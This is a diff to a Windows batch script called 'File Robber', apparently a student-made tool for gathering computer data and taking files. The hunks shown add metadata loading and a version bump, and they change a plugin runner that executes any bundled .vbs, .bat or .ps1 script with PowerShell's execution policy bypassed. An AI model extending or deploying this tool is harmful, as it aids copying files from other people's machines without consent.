@@ -3,6 +3,20 @@ setlocal
 
 echo Gathering Computer Data...
 
+REM -- PROGRAM INFO --
+for /F "usebackq tokens=1,* delims=: " %%a in ("info.json") do (
+    if "%%a"=="name" set "name=%%b"
+    if "%%a"=="version" set "version=%%b"
+    if "%%a"=="author" set "author=%%b"
+    if "%%a"=="description" set "description=%%b"
+)
+
+echo Program Name: %name%
+echo Program Version: %version%
+echo Program Author: %author%
+echo Program Description: %description%
+REM ------------------
+
 REM Get the current directory of the batch script
 set "scriptdir=%~dp0"
 
@@ -26,9 +40,9 @@ echo Starting File Robber...
 cls
 echo --------------------------------------------------------------------
 echo --------------------------------------------------------------------
-echo FILE ROBBER BETA V0.2
+echo FILE ROBBER BETA V0.4
 echo Created by @HighSchoolProgrammer on GitHub
-echo https://github.com/HighSchoolProgrammer/USB-File-Robber
+echo https://github.com/HighSchoolProgrammer/File-Robber
 echo --------------------------------------------------------------------
 echo --------------------------------------------------------------------
 
@@ -104,21 +118,23 @@ REM Check if the plugins folder exists
 if exist "%pluginsfolder%" (
     REM Loop through each file in the plugins folder
     for %%f in ("%pluginsfolder%\*") do (
-        REM Checbk if the file is a script
+        REM Check if the file is a script
         if "%%~xf"==".vbs" (
-            echo Running VBScript: %%~nxf
+            cls
+            echo Running Plugin: %%~nxf
             echo ----VBSCRIPT----
             cscript "%%f"
             echo ----------------
             echo Script %%~nxf executed.
         ) else if "%%~xf"==".bat" (
-            echo Running batch script: %%~nxf
+            cls
+            echo Running Plugin: %%~nxf
             echo ----BATCH SCRIPT----
             call "%%f"
             echo --------------------
             echo Script %%~nxf executed.
         ) else if "%%~xf"==".ps1" (
-            echo Running PowerShell script: %%~nxf
+            echo Running Plugin: %%~nxf
             echo ----POWERSHELL----
             powershell -ExecutionPolicy Bypass -File "%%f"
             echo ------------------
